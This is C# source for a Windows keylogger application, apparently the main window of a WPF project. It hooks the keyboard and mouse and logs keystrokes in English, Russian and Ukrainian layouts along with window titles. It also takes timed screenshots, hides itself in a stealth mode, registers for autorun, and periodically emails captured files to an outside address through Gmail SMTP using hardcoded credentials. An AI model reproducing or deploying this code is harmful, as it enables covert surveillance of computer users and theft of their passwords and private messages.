using System;
using System.Globalization;
using System.IO;
using System.Windows;
using System.Windows.Controls;
using System.Runtime.InteropServices;
using System.Windows.Interop;
using System.Windows.Threading;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Threading.Tasks;



namespace Keylogger
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        #region WinAPI
        [DllImport("user32.dll")]
        private static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModiefier, uint vk);
        [DllImport("user32.dll")]
        private static extern bool UnregisterHotKey(IntPtr hWnd, int id);
        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr processId);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int GetWindowText(int hWnd, StringBuilder text, int count);
        

        #endregion

        DispatcherTimer timerScreen = new DispatcherTimer();
        DispatcherTimer timerMail = new DispatcherTimer();
        string datatime = String.Empty;
        
      
        #region Language

        private CultureInfo _currentLanaguge;

        private static CultureInfo GetCurrentCulture()
        {
            var l = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
            return new CultureInfo((short)l.ToInt64());
        }

        private void HandleCurrentLanguage()
        {
            var currentCulture = GetCurrentCulture();
            if (_currentLanaguge == null || _currentLanaguge.LCID != currentCulture.LCID)
            {
                _currentLanaguge = currentCulture;
               // language.Content = _currentLanaguge.Name.ToString();
                // MessageBox.Show(_currentLanaguge.Name);
            }
        }

        #endregion

        public MainWindow()
        {
            InitializeComponent();

            txtNumScreen.Text = _numValueScreen.ToString();

            timerScreen.Tick += new EventHandler(timerScreen_tick);
            timerScreen.Interval = new TimeSpan(0,0,1);
            timerScreen.Start();

            txtNumMail.Text = _numValueScreen.ToString();

            timerMail.Tick += new EventHandler(timerMail_tick);
            timerMail.Interval = new TimeSpan(0, 0, 1);
            timerMail.Start();

            Task.Factory.StartNew(() =>
            {
                while (true)
                {
                    HandleCurrentLanguage();
                    Thread.Sleep(500);
                }
            });

            MouseHook.Start();
            MouseHook.MouseAction += new EventHandler(MouseEvent);

        }

        private void MouseEvent(object sender, EventArgs e)
        {
            if (IsWindowChanged())
            {
                if (IsMailSend())
                {
                }
                else
                {
                    StreamWriter SW = new StreamWriter(AutoRun.Path() + "Key.txt", true);
                    datatime = DateTime.Now.ToString();
                    SW.WriteLine();
                    SW.WriteLine(datatime + "\t" + winTitle);
                    SW.Close();
                }
            }

        }

        static string winTitle = String.Empty;

        #region WINDOW_Activity

        public static string GetActiveWindow()
        {
            const int cChars = 256;
            IntPtr ihandler = IntPtr.Zero;
            StringBuilder sBuff = new StringBuilder(cChars);
            ihandler = GetForegroundWindow();
            if (GetWindowText(ihandler.ToInt32(), sBuff, cChars) > 0)
                return sBuff.ToString();
            return "";
        }

        public static bool IsWindowChanged()
        {

            string wTitle = GetActiveWindow();// проверяем 
            bool res = wTitle != winTitle;
            winTitle = wTitle; // записываем активное кно на хранения для следующего сравнения
            return res; // и возвращаем результат comments
        }

        #endregion

        #region KEY_WRITE

        globalKeyboardHook gkh = new globalKeyboardHook();
        private int nextline = 0;

        #region Alphabet

        char[] RKey = new char[] { '0','1', '2', '3', '4', '5', '6', '7', '8', '9', 'Ё', 'Х', 'Ъ','Ж','Э','Б','Ю','.',
            'Й', 'Ц', 'У', 'К', 'Е', 'Н', 'Г', 'Ш', 'Щ', 'З','Ф', 'Ы', 'В', 'А', 'П',
            'Р', 'О', 'Л', 'Д', 'Я', 'Ч', 'С', 'М', 'И', 'Т', 'Ь'};
        char[] UKey = new char[]{
            '0','1', '2', '3', '4', '5', '6', '7', '8', '9', '\'', 'Х', 'Ї','Ж','Є','Б','Ю','.',
            'Й', 'Ц', 'У', 'К', 'Е', 'Н', 'Г', 'Ш', 'Щ', 'З','Ф', 'І', 'В', 'А', 'П',
            'Р', 'О', 'Л', 'Д', 'Я', 'Ч', 'С', 'М', 'И', 'Т', 'Ь'};

        char[] EKey = new char[]
        {
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '`', '[', ']', ';', '\'', ',', '.', '/',
            'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'Z', 'X', 'C',
            'V', 'B', 'N', 'M'
        };

        System.Windows.Forms.Keys[] keys = new System.Windows.Forms.Keys[]
        {
                System.Windows.Forms.Keys.D0,
                System.Windows.Forms.Keys.D1,
                System.Windows.Forms.Keys.D2,
                System.Windows.Forms.Keys.D3,
                System.Windows.Forms.Keys.D4,
                System.Windows.Forms.Keys.D5,
                System.Windows.Forms.Keys.D6,
                System.Windows.Forms.Keys.D7,
                System.Windows.Forms.Keys.D8,
                System.Windows.Forms.Keys.D9,
                System.Windows.Forms.Keys.Oem3,
                System.Windows.Forms.Keys.OemOpenBrackets,
                System.Windows.Forms.Keys.Oem6,
                System.Windows.Forms.Keys.Oem1,
                System.Windows.Forms.Keys.Oem7,
                System.Windows.Forms.Keys.Oemcomma,
                System.Windows.Forms.Keys.OemPeriod,
                System.Windows.Forms.Keys.OemQuestion,
                System.Windows.Forms.Keys.Q,
                System.Windows.Forms.Keys.W,
                System.Windows.Forms.Keys.E,
                System.Windows.Forms.Keys.R,
                System.Windows.Forms.Keys.T,
                System.Windows.Forms.Keys.Y,
                System.Windows.Forms.Keys.U,
                System.Windows.Forms.Keys.I,
                System.Windows.Forms.Keys.O,
                System.Windows.Forms.Keys.P,
                System.Windows.Forms.Keys.A,
                System.Windows.Forms.Keys.S,
                System.Windows.Forms.Keys.D,
                System.Windows.Forms.Keys.F,
                System.Windows.Forms.Keys.G,
                System.Windows.Forms.Keys.H,
                System.Windows.Forms.Keys.J,
                System.Windows.Forms.Keys.K,
                System.Windows.Forms.Keys.L,
                System.Windows.Forms.Keys.Z,
                System.Windows.Forms.Keys.X,
                System.Windows.Forms.Keys.C,
                System.Windows.Forms.Keys.V,
                System.Windows.Forms.Keys.B,
                System.Windows.Forms.Keys.N,
                System.Windows.Forms.Keys.M
        };

        #endregion
        
        private void KeysLoad()
        {
            gkh.KeyDown += new System.Windows.Forms.KeyEventHandler(gkh_KeyDown);
            //if (File.Exists(AutoRun.Path() + "Key.txt"))
            //{
            //    //File.Delete(AutoRun.Path() + "Key.txt"); тест 7fack off bitch
            //}
        }
        void gkh_KeyDown(object sender, System.Windows.Forms.KeyEventArgs e)
        {
            bool nonNumberEntered = false;

            if (IsMailSend())
            {
            }
            else
            {
                using (StreamWriter SW = new StreamWriter(AutoRun.Path() + "Key.txt", true))
                {

                    if (IsWindowChanged())
                    {
                        datatime = DateTime.Now.ToString();
                        SW.WriteLine();
                        SW.WriteLine();
                        SW.WriteLine(datatime + "\t" + winTitle);
                        SW.WriteLine();

                    }
                    if (nextline >= 70)
                    {
                        SW.WriteLine();
                        nextline = 0;
                    }

                    #region KEYS

                    if (!keys.Contains(e.KeyCode))
                    {
                        if (e.KeyCode == System.Windows.Forms.Keys.Space)
                            SW.Write(" ");
                        if (e.KeyCode == System.Windows.Forms.Keys.Return)
                        {
                            SW.WriteLine();
                            nextline = -1;
                        }
                        if (e.KeyCode == System.Windows.Forms.Keys.Multiply)
                            SW.Write("*");
                        if (e.KeyCode == System.Windows.Forms.Keys.Divide)
                            SW.Write("/");
                        if (e.KeyCode == System.Windows.Forms.Keys.OemMinus)
                            SW.Write("-");
                        if (e.KeyCode == System.Windows.Forms.Keys.Oemplus)
                            SW.Write("+");
                        if (e.KeyCode == System.Windows.Forms.Keys.NumPad0)
                            SW.Write("0");
                        if (e.KeyCode == System.Windows.Forms.Keys.NumPad1)
                            SW.Write("1");
                        if (e.KeyCode == System.Windows.Forms.Keys.NumPad2)
                            SW.Write("2");
                        if (e.KeyCode == System.Windows.Forms.Keys.NumPad3)
                            SW.Write("3");
                        if (e.KeyCode == System.Windows.Forms.Keys.NumPad4)
                            SW.Write("4");
                        if (e.KeyCode == System.Windows.Forms.Keys.NumPad5)
                            SW.Write("5");
                        if (e.KeyCode == System.Windows.Forms.Keys.NumPad6)
                            SW.Write("6");
                        if (e.KeyCode == System.Windows.Forms.Keys.NumPad7)
                            SW.Write("7");
                        if (e.KeyCode == System.Windows.Forms.Keys.NumPad8)
                            SW.Write("8");
                        if (e.KeyCode == System.Windows.Forms.Keys.NumPad9)
                            SW.Write("9");
                        if (e.KeyCode == System.Windows.Forms.Keys.Add)
                            SW.Write("+");
                        if (e.KeyCode == System.Windows.Forms.Keys.Subtract)
                            SW.Write("-");
                        if (e.KeyCode == System.Windows.Forms.Keys.D1)
                            SW.Write("-");
                        else
                        {
                            SW.Write("");
                            nextline--;
                        }
                        nextline++;


                    }
                    #endregion

                    else
                    {
                        switch (_currentLanaguge.Name)
                        {
                            case "en-US":
                                try
                                {
                                    SW.Write(EKey[keys.ToList().IndexOf(e.KeyCode)].ToString());
                                    nextline++;
                                }
                                catch (Exception ex)
                                {
                                    MessageBox.Show(ex.ToString());
                                }
                                break;
                            case "ru-RU":
                                try
                                {
                                    string rus = RKey[keys.ToList().IndexOf(e.KeyCode)].ToString();
                                    SW.Write(rus, true);
                                    nextline++;
                                }
                                catch (Exception ex)
                                {
                                    MessageBox.Show(ex.ToString());
                                }
                                break;
                            case "uk-UA":
                                try
                                {
                                    string ukr = UKey[keys.ToList().IndexOf(e.KeyCode)].ToString();
                                    SW.Write(ukr, true);
                                    nextline++;
                                }
                                catch (Exception ex)
                                {
                                    MessageBox.Show(ex.ToString());
                                }
                                break;

                            default:
                                SW.Write(e.KeyCode);
                                break;
                        }
                    }
                    SW.Close();
                }
            }
        }

        #endregion

        #region HotKey
        private const int HOTKEY_ID = 9000;
        private IntPtr _windowHandle;
        private HwndSource _source;

        protected override void OnSourceInitialized(EventArgs e)
        {
            base.OnSourceInitialized(e);

            _windowHandle = new WindowInteropHelper(this).Handle;
            _source = HwndSource.FromHwnd(_windowHandle);
            _source.AddHook(HwndHook);
            

            RegisterHotKey(_windowHandle, HOTKEY_ID, (uint)WindowsHotKey.Alt, (uint)WindowsHotKey.F12); //Alt + F12
        }
        //(uint)WindowsHotKey.Alt
        private IntPtr HwndHook(IntPtr hwnd, int msg, IntPtr wParam, IntPtr lParam, ref bool handled)
        {
            //HookDemoHelper hookDemoHelper = new HookDemoHelper();
            
            const int WM_HOTKEY = 0x0312;
            switch (msg)
            {
               
                case WM_HOTKEY:
                    switch (wParam.ToInt32())
                    {
                        case HOTKEY_ID:
                           
                            int vkey = (((int)lParam >> 16) & 0xFFFF);
                            if (vkey == (uint)WindowsHotKey.F12 )
                            {
                                Application.Current.MainWindow.Visibility = Visibility.Visible;
                            }
                            handled = true;
                            break;
                    }
                    break;
            }
            return IntPtr.Zero;
        }

        protected override void OnClosed(EventArgs e)
        {
            _source.RemoveHook(HwndHook);
            UnregisterHotKey(_windowHandle, HOTKEY_ID);
            base.OnClosed(e);
        }

        #endregion
        
        #region ScreenShotTimer

        private int timeScreen = 0;
        private void timerScreen_tick(object sender, EventArgs e)
        {
            timeScreen++;
            labeltimescreen.Content = timeScreen.ToString();
            
            if (_numValueScreen >= 1)
            {
                //MessageBox.Show(" ScreenShot Time ");
                if (_numValueScreen * 60 == timeScreen)
                {
                    timeScreen = 0;
                    string str = DateTime.Now.ToString().Replace(':', '_');
                    ScreenShot.ScreenSave(str);

                }
            }
            else
            {
                timeScreen = 0;
            }
        }

        private int _numValueScreen = 0;

        public int NumValueScreen
        {
            get { return _numValueScreen; }
            set
            {
                _numValueScreen = value;
                txtNumScreen.Text = value.ToString();
            }
        }

        

        private void cmdUpScreen_Click(object sender, RoutedEventArgs e)
        {
            NumValueScreen++;
            if (NumValueScreen >= 60) NumValueScreen = 60;
        }

        private void cmdDownScreen_Click(object sender, RoutedEventArgs e)
        {
           NumValueScreen--;
           if (NumValueScreen <=0) NumValueScreen = 0;
        }

        private void txtNumScreen_TextChanged(object sender, TextChangedEventArgs e)
        {
            if (txtNumScreen == null)
            {
                return;
            }

            if (!int.TryParse(txtNumScreen.Text, out _numValueScreen))
                txtNumScreen.Text = _numValueScreen.ToString();
        }


        #endregion

        #region MailTimer
        static bool sendbool = false;
        private static bool IsMailSend()
        {
            if (sendbool == true) return true;
            else return false;
        }

        private void InternetConnect()
        {
            IPStatus status = IPStatus.TimedOut;
            try
            {

                Ping ping = new Ping();
                PingReply reply = ping.Send(@"vk.com");
                status = reply.Status;
            }
            catch { }
            if (status != IPStatus.Success)
            {
                
            }
            else
            {
                SendMail();
                ClearFile();
            }

        }

        private void ClearFile()
        {
            File.Delete(AutoRun.Path()+ "Key.txt");
            File.Create(AutoRun.Path() + "Key.txt");

        }

        private void SendMail()
        {
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
            mail.From = new MailAddress("keyloggernazzim@gmail.com");
            if (txtBoxMail.Text != String.Empty)
            {
                if(txtBoxMail.Text.Contains('@') && txtBoxMail.Text.Contains('.'))
                    mail.To.Add(txtBoxMail.Text);
            }
            else
            {
                mail.To.Add("rusanovski@outlook.com");
            }
            mail.Subject = "Keylogger Mail ";
            mail.Body = "Keys";
            try
            {

                Attachment attachment;
                attachment = new Attachment(AutoRun.Path() + "yoda2.jpg");
                mail.Attachments.Add(attachment);

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("keyloggernazzim@gmail.com", "keylogger32");
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }

        }

        private int timeMail = 0;
        private void timerMail_tick(object sender, EventArgs e)
        {
            timeMail++;
            labeltimemail.Content = timeMail.ToString();

            if (_numValueMail >= 1)
            {
                if (_numValueMail * 2 == timeMail)
                {
                    sendbool = true;
                    InternetConnect();
                    timeMail = 0;
                    sendbool = false;

                }
            }
            else
            {
                timeMail = 0;
            }
        }

        private int _numValueMail = 0;

        public int NumValueMail
        {
            get { return _numValueMail; }
            set
            {
                _numValueMail = value;
                txtNumMail.Text = value.ToString();
            }
        }



        private void cmdUpMail_Click(object sender, RoutedEventArgs e)
        {
            NumValueMail = NumValueMail + 5;
            if (NumValueMail >= 1440) NumValueMail = 1440;
        }

        private void cmdDownMail_Click(object sender, RoutedEventArgs e)
        {
            NumValueMail= NumValueMail - 5;
            if (NumValueMail <= 0) NumValueMail = 0;
        }

        private void txtNumMail_TextChanged(object sender, TextChangedEventArgs e)
        {
            if (txtNumMail == null)
            {
                return;
            }

            if (!int.TryParse(txtNumMail.Text, out _numValueMail))
                txtNumMail.Text = _numValueMail.ToString();
        }

        #endregion

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            CheckAuto.IsChecked = Properties.Settings.Default.AutoRunProp;
            CheckStealth.IsChecked = Properties.Settings.Default.StealthProp;
            txtNumScreen.Text = Properties.Settings.Default.txtNumTimerScreenProp;
            txtNumMail.Text = Properties.Settings.Default.txtNumTimerMailProp;
            txtBoxMail.Text = Properties.Settings.Default.txtBoxMailProp;
        }

        private void Window_Closed(object sender, EventArgs e)
        {
            Properties.Settings.Default.AutoRunProp = (CheckAuto.IsChecked == true);
            Properties.Settings.Default.StealthProp = (CheckStealth.IsChecked == true);
            Properties.Settings.Default.txtNumTimerScreenProp = txtNumScreen.Text;
            Properties.Settings.Default.txtNumTimerMailProp = txtNumMail.Text;
            Properties.Settings.Default.txtBoxMailProp = txtBoxMail.Text;
            Properties.Settings.Default.Save();
        }

        private void AutoRun_Check(object sender, RoutedEventArgs e)
     {
         AutoRun.SetAutoRun(true, AutoRun.Path() + "Keylogger.exe"); 
     }

        private void AutoRun_UnChecked(object sender, RoutedEventArgs e) 
     {
         AutoRun.SetAutoRun(false, AutoRun.Path() + "Keylogger.exe");
     }

        private void Stealth_Checked(object sender, RoutedEventArgs e)
        {
            Application.Current.MainWindow.Visibility = Visibility.Hidden;
            KeysLoad();
        }

        private void Stealth_Unchecked(object sender, RoutedEventArgs e)
        {
            Application.Current.MainWindow.Visibility = Visibility.Visible;
        }

        private void tblock_TextChanged(object sender, TextChangedEventArgs e)
        {

        }
        
    }
}
